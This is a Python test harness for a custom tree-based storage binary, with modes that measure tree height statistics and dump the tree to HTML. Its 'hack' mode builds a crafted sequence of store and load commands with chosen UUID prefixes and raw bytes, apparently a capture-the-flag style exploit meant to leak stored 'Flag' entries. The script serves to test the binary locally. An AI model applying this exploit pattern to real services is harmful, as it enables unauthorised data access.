import uuid
import subprocess
import sys
import math
import struct

count = int(sys.argv[1])
command = sys.argv[2]

def call_storage(arg, uuids):

	try:
		output = subprocess.check_output(
		    ["bin/test_storage", arg],
		    input='\n'.join(uuids).encode('ascii', errors='replace'),
		)
		err = None
	except Exception as e:
		output = e.output
		err = e

	return (output.decode('ascii', errors='replace').strip(), err)

if command == "stats":
	for count in range(9000, 11000, 500):
		hmax = 0
		havg = 0
		runs = 100
		for _ in range(runs):
			output, err = call_storage('height', [str(uuid.uuid4()) for _ in range(count)])
			height = int(output)
			hmax = max(hmax, height)
			havg += height
		havg /= runs
		print('%d: max: %d, avg: %.2f' % (count, hmax, havg))
	exit()

if command == "hack":
	uuids = [
		'store 31300000-0000-0000-0000-000000000000 x',
		'store 312f0000-0000-0000-0000-000000000000 x',
		'store 312ff000-0000-0000-0000-000000000000 x',
		'store 312fff00-0000-0000-0000-000000000000 x',
		'store 312ffe00-0000-0000-0000-000000000000 x',
		'store 312ffef0-0000-0000-0000-000000000000 x',
		'store 312ffeef-0000-0000-0000-000000000000 x',
		'store 312ffeee-f000-0000-0000-000000000000 x',
		'store 312ffeee-ee00-0000-0000-000000000000 x',
		'store 312ffeee-ef00-0000-0000-000000000000 x',
		'store 312ffeee-efff-0000-0000-000000000000 x',
		'store 312ffeee-effe-0000-0000-000000000000 x',
		'store 7fffffff-0000-0000-0000-000000000000 \x01\x08',
		'load 312ffeee-effe-f000-0000-000000000000 x',
		'store 7fffffff-0000-0000-0000-000000000000 \x02\x08',
		'load 312ffeee-effe-f000-0000-000000000000 x',
	]

	for i in range(2049, 2049 + count):
		uuids += [ 'store 7fffffff-0000-0000-0000-000000000000 ' + struct.pack('H', i).decode('ascii'), 'load 312ffeee-effe-f000-0000-000000000000 x' ]

	uuids = ['store ' + str(uuid.uuid4()) + ' Flag' + str(i) for i in range(count)] + uuids

	output, err = call_storage('hack', uuids)
	print(output)
	if err:
		raise err
	exit()

output, err = call_storage(command, [str(uuid.uuid4()) for _ in range(count)])

print(output)

if err:
	raise err

if command == "dump":
	with open("tree/tree.html", "r") as f:
		with open("bin/tree.html", "w") as fout:
			fout.write(f.read().replace("JSON", output))